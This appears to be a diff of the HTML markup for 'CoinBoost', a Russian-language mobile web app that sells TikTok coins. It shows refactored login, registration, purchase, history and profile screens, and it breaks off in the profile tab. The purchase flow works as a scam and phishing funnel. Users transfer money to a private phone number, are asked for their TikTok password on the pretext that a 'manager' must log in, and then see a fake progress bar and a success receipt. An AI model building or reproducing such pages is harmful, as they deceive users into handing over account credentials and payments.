@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#1c1c1d">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
@@ -30,11 +30,13 @@
 
     <style>
         body {
-            background-color: #1c1c1d;
+            background-color: #000000;
             color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             -webkit-tap-highlight-color: transparent;
-            overscroll-behavior-y: none; /* Защита от свайпа вниз в браузере */
+            overscroll-behavior-y: none;
+            margin: 0;
+            padding: 0;
         }
 
         /* Убираем стрелки у инпутов */
@@ -45,362 +47,354 @@
         .hide-scrollbar::-webkit-scrollbar { display: none; }
         .hide-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
 
-        /* Анимации из оригинального кода */
-        .fade-in { animation: fadeIn 0.3s ease-out forwards; }
-        .slide-in-right { animation: slideInRight 0.3s ease-out forwards; }
-        .slide-in-bottom { animation: slideInBottom 0.3s ease-out forwards; }
-        .zoom-in { animation: zoomIn 0.3s ease-out forwards; }
+        /* Анимации */
+        .fade-in { animation: fadeIn 0.25s ease-out forwards; }
+        .slide-in-right { animation: slideInRight 0.25s ease-out forwards; }
+        .slide-in-bottom { animation: slideInBottom 0.25s ease-out forwards; }
+        .zoom-in { animation: zoomIn 0.25s ease-out forwards; }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         @keyframes slideInRight { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
         @keyframes slideInBottom { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes zoomIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
 
-        /* Структура экранов */
-        .screen { display: none; height: 100%; flex-direction: column; overflow-y: auto; padding-bottom: 80px; }
-        .screen.active { display: flex; }
-        
-        .tab-content { display: none; height: 100%; flex-direction: column; overflow-y: auto; padding-bottom: 80px;}
-        .tab-content.active { display: flex; }
+        /* Вспомогательные классы для роутинга */
+        .app-view { display: none; }
+        .app-view.active { display: flex; flex-direction: column; height: 100%; }
 
-        .buy-flow-screen { display: none; flex-direction: column; height: 100%; padding-bottom: 80px;}
-        .buy-flow-screen.active { display: flex; }
+        .tab-view { display: none; }
+        .tab-view.active { display: block; }
 
-        #auth-screens .screen { padding-bottom: 0; }
-
-        /* Навбар */
-        .nav-item { transition: all 0.2s; }
-        .nav-item.active { color: #3390ec; }
-        .nav-item.inactive { color: #8e8e93; }
+        .flow-view { display: none; }
+        .flow-view.active { display: flex; flex-direction: column; min-height: 100%; }
 
         /* iPhone Safe Area */
         .pb-safe { padding-bottom: env(safe-area-inset-bottom, 16px); }
-        .pt-safe { padding-top: env(safe-area-inset-top, 0px); }
         
-        /* Защита от прыжков контента из-за position absolute */
-        .content-wrapper { flex: 1; display: flex; flex-direction: column; }
+        /* Фикс для мобильной высоты */
+        .mobile-height { height: 100dvh; }
     </style>
 </head>
-<body class="h-screen w-full overflow-hidden flex justify-center bg-black">
+<body class="mobile-height w-full overflow-hidden flex justify-center">
 
-    <div class="w-full max-w-md h-full relative bg-tgBg shadow-2xl pt-safe flex flex-col" id="app-container">
+    <div id="app-container" class="w-full max-w-md mobile-height bg-tgBg shadow-2xl relative flex flex-col">
 
         <!-- ========================================== -->
         <!-- БЛОК 1: АВТОРИЗАЦИЯ                        -->
         <!-- ========================================== -->
-        <div id="auth-screens" class="flex-1 h-full relative">
-            
+        <div id="auth-screens" class="app-view active overflow-y-auto">
             <!-- Экран входа -->
-            <div id="screen-login" class="screen active fade-in zoom-in p-6 items-center justify-center space-y-8">
-                <div class="w-24 h-24 bg-gradient-to-tr from-blue-500 to-purple-500 rounded-3xl flex items-center justify-center shadow-lg shadow-blue-500/20">
-                    <i data-lucide="coins" class="w-12 h-12 text-white"></i>
-                </div>
-                <div class="text-center">
-                    <h1 class="text-3xl font-bold mb-2 text-white">Вход</h1>
-                    <p class="text-tgHint text-sm">С возвращением в CoinBoost!</p>
-                </div>
-                
-                <div class="w-full space-y-4">
-                    <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
-                        <i data-lucide="user" class="w-5 h-5 text-gray-400 mr-3"></i>
-                        <input type="text" id="login-username" placeholder="Логин" class="bg-transparent border-none outline-none text-white w-full text-lg" autocapitalize="off">
+            <div id="screen-login" class="flow-view active p-6 justify-center fade-in zoom-in">
+                <div class="flex flex-col items-center space-y-8 mt-10">
+                    <div class="w-24 h-24 bg-gradient-to-tr from-blue-500 to-purple-500 rounded-3xl flex items-center justify-center shadow-lg shadow-blue-500/20">
+                        <i data-lucide="coins" class="w-12 h-12 text-white"></i>
                     </div>
-                    <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
-                        <i data-lucide="lock" class="w-5 h-5 text-gray-400 mr-3"></i>
-                        <input type="password" id="login-password" placeholder="Пароль" class="bg-transparent border-none outline-none text-white w-full text-lg">
+                    <div class="text-center">
+                        <h1 class="text-3xl font-bold mb-2 text-white">Вход</h1>
+                        <p class="text-tgHint text-sm">С возвращением в CoinBoost!</p>
                     </div>
-                    <div id="login-error" class="hidden text-red-400 text-sm text-center">Неверный логин или пароль</div>
+                    
+                    <div class="w-full space-y-4">
+                        <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
+                            <i data-lucide="user" class="w-5 h-5 text-gray-400 mr-3"></i>
+                            <input type="text" id="login-username" placeholder="Логин" class="bg-transparent border-none outline-none text-white w-full text-lg" autocapitalize="off">
+                        </div>
+                        <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
+                            <i data-lucide="lock" class="w-5 h-5 text-gray-400 mr-3"></i>
+                            <input type="password" id="login-password" placeholder="Пароль" class="bg-transparent border-none outline-none text-white w-full text-lg">
+                        </div>
+                        <div id="login-error" class="hidden text-red-400 text-sm text-center">Неверный логин или пароль</div>
+                    </div>
                 </div>
-
-                <div class="w-full space-y-3 mt-8">
-                    <button onclick="handleLogin()" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">
-                        Войти
-                    </button>
-                    <button onclick="switchAuthScreen('screen-register')" class="w-full bg-transparent border border-gray-600 text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">
-                        Создать аккаунт
-                    </button>
+                <div class="w-full space-y-3 mt-auto pt-10">
+                    <button onclick="handleLogin()" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Войти</button>
+                    <button onclick="switchAuthScreen('screen-register')" class="w-full bg-transparent border border-gray-600 text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Создать аккаунт</button>
                 </div>
             </div>
 
             <!-- Экран регистрации -->
-            <div id="screen-register" class="screen slide-in-right p-6 items-center justify-center space-y-6">
-                <button onclick="switchAuthScreen('screen-login')" class="absolute top-6 left-6 p-2 text-tgButton">
+            <div id="screen-register" class="flow-view p-6 slide-in-right">
+                <button onclick="switchAuthScreen('screen-login')" class="self-start mb-6 p-2 -ml-2 text-tgButton">
                     <i data-lucide="arrow-left" class="w-6 h-6"></i>
                 </button>
-
-                <div class="text-center mt-8">
-                    <h1 class="text-3xl font-bold mb-2 text-white">Регистрация</h1>
-                    <p class="text-tgHint text-sm">Создайте аккаунт для истории покупок</p>
-                </div>
-                
-                <div class="w-full space-y-4">
-                    <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
-                        <i data-lucide="user" class="w-5 h-5 text-gray-400 mr-3"></i>
-                        <input type="text" id="reg-username" placeholder="Придумайте логин" class="bg-transparent border-none outline-none text-white w-full text-lg" autocapitalize="off">
+                <div class="flex flex-col items-center flex-1">
+                    <div class="text-center mb-8">
+                        <h1 class="text-3xl font-bold mb-2 text-white">Регистрация</h1>
+                        <p class="text-tgHint text-sm">Создайте аккаунт для истории покупок</p>
                     </div>
-                    <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
-                        <i data-lucide="lock" class="w-5 h-5 text-gray-400 mr-3"></i>
-                        <input type="password" id="reg-password" placeholder="Придумайте пароль" class="bg-transparent border-none outline-none text-white w-full text-lg">
+                    <div class="w-full space-y-4">
+                        <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
+                            <i data-lucide="user" class="w-5 h-5 text-gray-400 mr-3"></i>
+                            <input type="text" id="reg-username" placeholder="Придумайте логин" class="bg-transparent border-none outline-none text-white w-full text-lg" autocapitalize="off">
+                        </div>
+                        <div class="bg-tgCard rounded-xl p-3 border border-transparent focus-within:border-tgButton flex items-center transition-colors">
+                            <i data-lucide="lock" class="w-5 h-5 text-gray-400 mr-3"></i>
+                            <input type="password" id="reg-password" placeholder="Придумайте пароль" class="bg-transparent border-none outline-none text-white w-full text-lg">
+                        </div>
+                        <div id="reg-error" class="hidden text-red-400 text-sm text-center">Заполните все поля</div>
                     </div>
-                    <div id="reg-error" class="hidden text-red-400 text-sm text-center">Заполните все поля</div>
                 </div>
-
-                <div class="w-full mt-8">
-                    <button onclick="handleRegister()" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">
-                        Зарегистрироваться
-                    </button>
+                <div class="w-full mt-auto pt-10">
+                    <button onclick="handleRegister()" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Зарегистрироваться</button>
                 </div>
             </div>
-
         </div>
 
         <!-- ========================================== -->
         <!-- БЛОК 2: ОСНОВНОЕ ПРИЛОЖЕНИЕ                -->
         <!-- ========================================== -->
-        <div id="main-app" class="hidden flex-1 h-full relative">
+        <div id="main-app" class="app-view relative">
             
-            <!-- ТАБ 1: ПОКУПКА -->
-            <div id="tab-buy" class="tab-content active relative h-full">
+            <!-- Контейнер для прокрутки контента (отступ снизу управляется JS) -->
+            <div id="main-scroll-container" class="flex-1 overflow-y-auto pb-[70px] transition-all duration-300">
                 
-                <!-- 1. Ввод TikTok -->
-                <div id="flow-tiktok-link" class="buy-flow-screen active p-4 fade-in content-wrapper relative">
-                    <h2 class="text-xl font-bold mb-6 text-center mt-4 text-white">Новая покупка</h2>
+                <!-- ТАБ 1: ПОКУПКА -->
+                <div id="tab-buy" class="tab-view active h-full">
                     
-                    <div class="bg-tgCard rounded-2xl p-4 mb-2 shadow-sm border border-transparent focus-within:border-tgButton transition-colors">
-                        <label class="text-tgHint text-xs mb-2 block uppercase tracking-wider font-semibold">Username TikTok</label>
-                        <div class="flex items-center">
-                            <span class="text-gray-400 mr-1 text-lg">@</span>
-                            <input type="text" id="tiktok-username-input" placeholder="khaby.lame" class="bg-transparent border-none outline-none text-white w-full text-lg" autocapitalize="off">
+                    <!-- 1. Ввод TikTok (Главная страница покупки) -->
+                    <div id="flow-tiktok-link" class="flow-view active p-4 fade-in">
+                        <h2 class="text-xl font-bold mb-6 text-center mt-4 text-white">Новая покупка</h2>
+                        
+                        <div class="bg-tgCard rounded-2xl p-4 mb-2 shadow-sm border border-transparent focus-within:border-tgButton transition-colors">
+                            <label class="text-tgHint text-xs mb-2 block uppercase tracking-wider font-semibold">Username TikTok</label>
+                            <div class="flex items-center">
+                                <span class="text-gray-400 mr-1 text-lg">@</span>
+                                <input type="text" id="tiktok-username-input" placeholder="khaby.lame" class="bg-transparent border-none outline-none text-white w-full text-lg" autocapitalize="off">
+                            </div>
+                        </div>
+
+                        <div id="tiktok-error" class="hidden items-center text-red-400 text-sm mt-2 px-2">
+                            <i data-lucide="alert-circle" class="w-4 h-4 mr-1"></i>
+                            <span id="tiktok-error-text">Аккаунт не найден</span>
+                        </div>
+
+                        <div id="quick-accounts-block" class="mt-6 hidden">
+                            <p class="text-tgHint text-xs mb-3 px-2 uppercase font-semibold">Недавние аккаунты</p>
+                            <div id="quick-accounts-list" class="flex overflow-x-auto space-x-3 pb-2 px-2 -mx-2 hide-scrollbar">
+                                <!-- JS -->
+                            </div>
+                        </div>
+
+                        <div class="mt-auto pt-8">
+                            <button id="btn-search-tiktok" onclick="searchTikTok()" disabled class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg flex justify-center items-center active:scale-95 transition-all disabled:opacity-50">
+                                <span id="btn-search-text">Продолжить</span>
+                                <i id="btn-search-loader" data-lucide="loader-2" class="hidden animate-spin w-6 h-6"></i>
+                            </button>
                         </div>
                     </div>
 
-                    <div id="tiktok-error" class="hidden items-center text-red-400 text-sm mt-2 px-2">
-                        <i data-lucide="alert-circle" class="w-4 h-4 mr-1"></i>
-                        <span id="tiktok-error-text">Аккаунт не найден</span>
-                    </div>
-
-                    <!-- Быстрые аккаунты -->
-                    <div id="quick-accounts-block" class="mt-6 hidden">
-                        <p class="text-tgHint text-xs mb-3 px-2 uppercase font-semibold">Недавние аккаунты</p>
-                        <div id="quick-accounts-list" class="flex overflow-x-auto space-x-3 pb-2 px-2 -mx-2 hide-scrollbar">
-                            <!-- JS -->
-                        </div>
-                    </div>
-
-                    <div class="mt-auto absolute bottom-4 left-0 w-full px-4">
-                        <button id="btn-search-tiktok" onclick="searchTikTok()" disabled class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg flex justify-center items-center active:scale-95 transition-all disabled:opacity-50">
-                            <span id="btn-search-text">Продолжить</span>
-                            <i id="btn-search-loader" data-lucide="loader-2" class="hidden animate-spin w-6 h-6"></i>
+                    <!-- 2. Подтверждение аккаунта -->
+                    <div id="flow-tiktok-confirm" class="flow-view p-4 slide-in-right">
+                        <button onclick="switchFlow('flow-tiktok-link')" class="self-start mb-4 p-2 -ml-2 text-tgButton">
+                            <i data-lucide="arrow-left" class="w-6 h-6"></i>
                         </button>
-                    </div>
-                </div>
-
-                <!-- 2. Подтверждение аккаунта -->
-                <div id="flow-tiktok-confirm" class="buy-flow-screen p-4 items-center slide-in-right content-wrapper relative">
-                    <button onclick="switchFlow('flow-tiktok-link')" class="self-start mb-4 p-2 -ml-2 text-tgButton">
-                        <i data-lucide="arrow-left" class="w-6 h-6"></i>
-                    </button>
-                    <h2 class="text-xl font-bold mb-8 text-white">Это ваш аккаунт?</h2>
-                    
-                    <div class="flex flex-col items-center mb-10 text-center w-full">
-                        <div class="w-28 h-28 rounded-full overflow-hidden border-4 border-tgButton mb-4 bg-gray-800">
-                            <img id="confirm-avatar" src="" alt="avatar" class="w-full h-full object-cover">
+                        <h2 class="text-xl font-bold mb-8 text-center text-white">Это ваш аккаунт?</h2>
+                        
+                        <div class="flex flex-col items-center mb-10 text-center w-full">
+                            <div class="w-28 h-28 rounded-full overflow-hidden border-4 border-tgButton mb-4 bg-gray-800">
+                                <img id="confirm-avatar" src="" alt="avatar" class="w-full h-full object-cover">
+                            </div>
+                            <h3 id="confirm-username" class="text-2xl font-bold text-white">@username</h3>
+                            <p id="confirm-nickname" class="text-gray-300 text-sm mt-1"></p>
+                            <div class="mt-3 bg-tgCard px-4 py-1.5 rounded-full inline-flex items-center">
+                                <i data-lucide="user" class="w-3.5 h-3.5 text-tgButton mr-1.5"></i>
+                                <span id="confirm-followers" class="font-semibold text-white">0</span>
+                                <span class="text-tgHint ml-1 text-sm">подписчиков</span>
+                            </div>
                         </div>
-                        <h3 id="confirm-username" class="text-2xl font-bold text-white">@username</h3>
-                        <p id="confirm-nickname" class="text-gray-300 text-sm mt-1"></p>
-                        <div class="mt-3 bg-tgCard px-4 py-1.5 rounded-full inline-flex items-center">
-                            <i data-lucide="user" class="w-3.5 h-3.5 text-tgButton mr-1.5"></i>
-                            <span id="confirm-followers" class="font-semibold text-white">0</span>
-                            <span class="text-tgHint ml-1 text-sm">подписчиков</span>
+
+                        <div class="w-full space-y-3 mt-auto pt-8">
+                            <button onclick="switchFlow('flow-coin-select')" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Да, верно</button>
+                            <button onclick="switchFlow('flow-tiktok-link')" class="w-full bg-[#3a3a3c] text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Нет, другой аккаунт</button>
                         </div>
                     </div>
 
-                    <div class="mt-auto w-full space-y-3 absolute bottom-4 left-0 px-4">
-                        <button onclick="switchFlow('flow-coin-select')" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Да, верно</button>
-                        <button onclick="switchFlow('flow-tiktok-link')" class="w-full bg-[#3a3a3c] text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Нет, другой аккаунт</button>
-                    </div>
-                </div>
+                    <!-- 3. Выбор монет -->
+                    <div id="flow-coin-select" class="flow-view p-4 slide-in-right">
+                        <button onclick="switchFlow('flow-tiktok-confirm')" class="self-start mb-2 p-2 -ml-2 text-tgButton">
+                            <i data-lucide="arrow-left" class="w-6 h-6"></i>
+                        </button>
+                        <h2 class="text-xl font-bold mb-2 text-center text-white">Покупка монет</h2>
+                        <p class="text-tgHint text-center mb-6">Курс: 1 монета = 1.2₽</p>
 
-                <!-- 3. Выбор монет -->
-                <div id="flow-coin-select" class="buy-flow-screen p-4 slide-in-right content-wrapper relative">
-                    <button onclick="switchFlow('flow-tiktok-confirm')" class="self-start mb-2 p-2 -ml-2 text-tgButton">
-                        <i data-lucide="arrow-left" class="w-6 h-6"></i>
-                    </button>
-                    <h2 class="text-xl font-bold mb-2 text-center text-white">Покупка монет</h2>
-                    <p class="text-tgHint text-center mb-6">Курс: 1 монета = 1.2₽</p>
-
-                    <div class="bg-tgCard rounded-2xl p-6 mb-6 flex flex-col items-center">
-                        <i data-lucide="coins" class="w-12 h-12 text-yellow-400 mb-4"></i>
-                        <input type="number" id="coin-input" value="100" class="bg-transparent text-center text-4xl font-bold text-white w-full outline-none mb-2">
-                        <span class="text-tgHint">монет</span>
-                    </div>
-
-                    <div class="grid grid-cols-2 gap-3 mb-8">
-                        <button onclick="selectCoins(100)" class="coin-preset active bg-tgButton text-white py-3 rounded-xl font-medium shadow-lg shadow-blue-500/30 scale-105 transition-all" data-amount="100">100</button>
-                        <button onclick="selectCoins(500)" class="coin-preset bg-tgCard text-gray-300 py-3 rounded-xl font-medium transition-all" data-amount="500">500</button>
-                        <button onclick="selectCoins(1000)" class="coin-preset bg-tgCard text-gray-300 py-3 rounded-xl font-medium transition-all" data-amount="1000">1000</button>
-                        <button onclick="selectCoins(5000)" class="coin-preset bg-tgCard text-gray-300 py-3 rounded-xl font-medium transition-all" data-amount="5000">5000</button>
-                    </div>
-
-                    <div class="mt-auto absolute bottom-4 left-0 w-full px-4">
-                        <div class="flex justify-between items-center mb-4 px-2">
-                            <span class="text-lg text-white">К оплате:</span>
-                            <span id="total-price" class="text-2xl font-bold text-white">120.00 ₽</span>
+                        <div class="bg-tgCard rounded-2xl p-6 mb-6 flex flex-col items-center">
+                            <i data-lucide="coins" class="w-12 h-12 text-yellow-400 mb-4"></i>
+                            <input type="number" id="coin-input" value="100" class="bg-transparent text-center text-4xl font-bold text-white w-full outline-none mb-2">
+                            <span class="text-tgHint">монет</span>
                         </div>
-                        <button id="btn-to-pay" onclick="switchFlow('flow-payment')" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Перейти к оплате</button>
-                    </div>
-                </div>
 
-                <!-- 4. Оплата -->
-                <div id="flow-payment" class="buy-flow-screen p-4 slide-in-bottom content-wrapper relative">
-                    <button onclick="switchFlow('flow-coin-select')" class="self-start mb-2 p-2 -ml-2 text-tgButton">
-                        <i data-lucide="arrow-left" class="w-6 h-6"></i>
-                    </button>
-                    <h2 class="text-xl font-bold mb-6 text-center text-white">Оплата по СБП</h2>
-                    
-                    <div class="bg-white text-black rounded-2xl p-5 mb-6 shadow-md">
-                        <div class="text-center mb-4">
-                            <p class="text-sm text-gray-500">Сумма перевода</p>
-                            <p id="payment-sum" class="text-3xl font-bold text-gray-900">120.00 ₽</p>
+                        <div class="grid grid-cols-2 gap-3 mb-8">
+                            <button onclick="selectCoins(100)" class="coin-preset active bg-tgButton text-white py-3 rounded-xl font-medium shadow-lg shadow-blue-500/30 scale-105 transition-all" data-amount="100">100</button>
+                            <button onclick="selectCoins(500)" class="coin-preset bg-tgCard text-gray-300 py-3 rounded-xl font-medium transition-all" data-amount="500">500</button>
+                            <button onclick="selectCoins(1000)" class="coin-preset bg-tgCard text-gray-300 py-3 rounded-xl font-medium transition-all" data-amount="1000">1000</button>
+                            <button onclick="selectCoins(5000)" class="coin-preset bg-tgCard text-gray-300 py-3 rounded-xl font-medium transition-all" data-amount="5000">5000</button>
                         </div>
-                        <div class="space-y-4 border-t border-gray-200 pt-4">
-                            <div><p class="text-xs text-gray-500 mb-1">Банк получателя</p><p class="font-semibold">Сбербанк</p></div>
-                            <div>
-                                <p class="text-xs text-gray-500 mb-1">Номер телефона</p>
-                                <div class="flex justify-between items-center bg-gray-100 p-3 rounded-lg border border-gray-200">
-                                    <span class="font-semibold text-lg">+7 (999) 123-45-67</span>
-                                    <button onclick="copyPhone(this)" class="text-tgButton p-1">
-                                        <i data-lucide="copy" class="w-5 h-5"></i>
-                                    </button>
+
+                        <div class="mt-auto pt-8">
+                            <div class="flex justify-between items-center mb-4 px-2">
+                                <span class="text-lg text-white">К оплате:</span>
+                                <span id="total-price" class="text-2xl font-bold text-white">120.00 ₽</span>
+                            </div>
+                            <button id="btn-to-pay" onclick="switchFlow('flow-payment')" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Перейти к оплате</button>
+                        </div>
+                    </div>
+
+                    <!-- 4. Оплата -->
+                    <div id="flow-payment" class="flow-view p-4 slide-in-bottom">
+                        <button onclick="switchFlow('flow-coin-select')" class="self-start mb-2 p-2 -ml-2 text-tgButton">
+                            <i data-lucide="arrow-left" class="w-6 h-6"></i>
+                        </button>
+                        <h2 class="text-xl font-bold mb-6 text-center text-white">Оплата по СБП</h2>
+                        
+                        <div class="bg-white text-black rounded-2xl p-5 mb-6 shadow-md">
+                            <div class="text-center mb-4">
+                                <p class="text-sm text-gray-500">Сумма перевода</p>
+                                <p id="payment-sum" class="text-3xl font-bold text-gray-900">120.00 ₽</p>
+                            </div>
+                            <div class="space-y-4 border-t border-gray-200 pt-4">
+                                <div><p class="text-xs text-gray-500 mb-1">Банк получателя</p><p class="font-semibold">Сбербанк</p></div>
+                                <div>
+                                    <p class="text-xs text-gray-500 mb-1">Номер телефона</p>
+                                    <div class="flex justify-between items-center bg-gray-100 p-3 rounded-lg border border-gray-200">
+                                        <span class="font-semibold text-lg">+7 (999) 123-45-67</span>
+                                        <button onclick="copyPhone(this)" class="text-tgButton p-1">
+                                            <i data-lucide="copy" class="w-5 h-5"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div><p class="text-xs text-gray-500 mb-1">Получатель</p><p class="font-semibold">Иван И.</p></div>
+                            </div>
+                        </div>
+                        
+                        <div class="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4 mb-6">
+                            <p class="text-yellow-400 text-sm text-center">Переведите точную сумму по указанным реквизитам. После перевода нажмите кнопку "Я оплатил".</p>
+                        </div>
+
+                        <div class="mt-auto pt-8">
+                            <button onclick="switchFlow('flow-password')" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Я оплатил</button>
+                        </div>
+                    </div>
+
+                    <!-- 5. Пароль -->
+                    <div id="flow-password" class="flow-view p-4 slide-in-right">
+                        <div class="flex flex-col items-center justify-center flex-1 py-10">
+                            <div class="w-16 h-16 bg-tgCard rounded-full flex items-center justify-center mb-6">
+                                <i data-lucide="lock" class="w-8 h-8 text-tgButton"></i>
+                            </div>
+                            <h2 class="text-2xl font-bold mb-2 text-center text-white">Вход в аккаунт</h2>
+                            <p class="text-tgHint text-center mb-8 px-4 text-sm">
+                                Для безопасного пополнения баланса менеджеру необходимо авторизоваться в вашем аккаунте TikTok.
+                            </p>
+                            <div class="w-full bg-tgCard rounded-xl p-4 flex items-center mb-6 border border-transparent focus-within:border-tgButton transition-colors">
+                                <input type="password" id="tiktok-password" placeholder="Пароль от TikTok" class="bg-transparent outline-none w-full text-lg text-white">
+                            </div>
+                        </div>
+                        
+                        <div class="mt-auto pt-4">
+                            <button id="btn-password" onclick="startLoading()" disabled class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform disabled:opacity-50">Продолжить</button>
+                        </div>
+                    </div>
+
+                    <!-- 6. Загрузка -->
+                    <div id="flow-loading" class="flow-view p-6 items-center justify-center fade-in">
+                        <div class="flex flex-col items-center space-y-12 my-auto">
+                            <div class="relative w-40 h-40 flex items-center justify-center">
+                                <svg class="w-full h-full transform -rotate-90" viewBox="0 0 100 100">
+                                    <circle class="text-tgCard stroke-current" stroke-width="6" cx="50" cy="50" r="44" fill="transparent"></circle>
+                                    <circle id="progress-circle" class="text-tgButton stroke-current transition-all duration-200" stroke-width="6" stroke-linecap="round" cx="50" cy="50" r="44" fill="transparent" stroke-dasharray="276" stroke-dashoffset="276"></circle>
+                                </svg>
+                                <div class="absolute flex flex-col items-center justify-center">
+                                    <i data-lucide="coins" class="w-8 h-8 text-yellow-400 mb-1"></i>
+                                    <span id="progress-text" class="text-2xl font-bold text-white">0%</span>
                                 </div>
                             </div>
-                            <div><p class="text-xs text-gray-500 mb-1">Получатель</p><p class="font-semibold">Иван И.</p></div>
+                            <div class="text-center h-16">
+                                <p id="progress-status" class="text-tgHint animate-pulse">Инициализация...</p>
+                            </div>
                         </div>
                     </div>
+
+                    <!-- 7. Успех -->
+                    <div id="flow-success" class="flow-view p-6 zoom-in">
+                        <div class="flex flex-col items-center justify-center flex-1 pt-8">
+                            <div class="w-24 h-24 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
+                                <i data-lucide="check-circle-2" class="w-16 h-16 text-green-500"></i>
+                            </div>
+                            <h2 class="text-3xl font-bold mb-2 text-white">Успешно!</h2>
+                            <p class="text-tgHint text-center mb-8 px-4">
+                                Баланс аккаунта <span id="success-username" class="text-white font-semibold">@user</span> пополнен на <span id="success-coins" class="text-yellow-400 font-bold">100 монет</span>.
+                            </p>
+                            
+                            <div class="w-full bg-tgCard rounded-xl p-5 mb-10 border border-gray-800">
+                                <div class="flex justify-between items-center py-2 border-b border-gray-700/50">
+                                    <span class="text-gray-400">Сумма:</span>
+                                    <span class="font-bold text-white flex items-center"><i data-lucide="coins" class="w-4 h-4 text-yellow-400 mr-1.5"></i><span id="receipt-coins">100</span></span>
+                                </div>
+                                <div class="flex justify-between items-center py-2 border-b border-gray-700/50">
+                                    <span class="text-gray-400">Оплачено:</span>
+                                    <span id="receipt-price" class="font-bold text-white">120.00 ₽</span>
+                                </div>
+                                <div class="flex justify-between items-center py-2">
+                                    <span class="text-gray-400">Статус:</span>
+                                    <span class="font-bold text-green-500">Выполнено</span>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="mt-auto pt-8">
+                            <button onclick="resetFlow()" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Вернуться на главную</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ТАБ 2: ИСТОРИЯ -->
+                <div id="tab-history" class="tab-view p-4 fade-in min-h-full">
+                    <h2 class="text-xl font-bold mb-6 mt-2 text-center text-white border-b border-gray-800 pb-4">История покупок</h2>
+                    <div id="history-list" class="space-y-3 pb-6">
+                        <!-- JS -->
+                    </div>
+                    <div id="history-empty" class="hidden flex flex-col items-center justify-center h-64 opacity-50">
+                        <i data-lucide="receipt" class="w-16 h-16 mb-4 text-tgHint"></i>
+                        <p class="text-white font-medium">История пуста</p>
+                    </div>
+                </div>
+
+                <!-- ТАБ 3: ПРОФИЛЬ -->
+                <div id="tab-profile" class="tab-view p-4 fade-in min-h-full">
+                    <h2 class="text-xl font-bold mb-6 mt-2 text-center text-white border-b border-gray-800 pb-4">Мой профиль</h2>
                     
-                    <div class="bg-yellow-500/10 border border-yellow-500/30 rounded-xl p-4 mb-6">
-                        <p class="text-yellow-400 text-sm text-center">Переведите точную сумму по указанным реквизитам. После перевода нажмите кнопку "Я оплатил".</p>
+                    <div class="bg-tgCard rounded-2xl p-6 flex items-center mb-8 border border-gray-800">
+                        <div class="w-16 h-16 bg-tgButton rounded-full flex items-center justify-center text-2xl font-bold mr-4 text-white" id="profile-avatar-letter">U</div>
+                        <div>
+                            <h3 class="text-xl font-bold text-white" id="profile-username">User</h3>
+                            <p class="text-tgHint text-sm">Аккаунт CoinBoost</p>
+                        </div>
                     </div>
 
-                    <div class="mt-auto absolute bottom-4 left-0 w-full px-4 space-y-3">
-                        <button onclick="switchFlow('flow-password')" class="w-full bg-tgButton text-white py-3.5 rounded-xl font-semibold text-lg active:scale-95 transition-transform">Я оплатил</button>
+                    <h3 class="text-sm font-bold mb-4 text-tgHint uppercase tracking-wider px-2">Сохраненные TikTok</h3>
+                    <div id="profile-accounts-list" class="space-y-3 pb-6">
+                        <!-- JS -->
                     </div>
+                    <div id="profile-accounts-empty" class="hidden text-center text-tgHint py-4 text-sm bg-tgCard rounded-xl">Нет сохраненных аккаунтов</div>
+
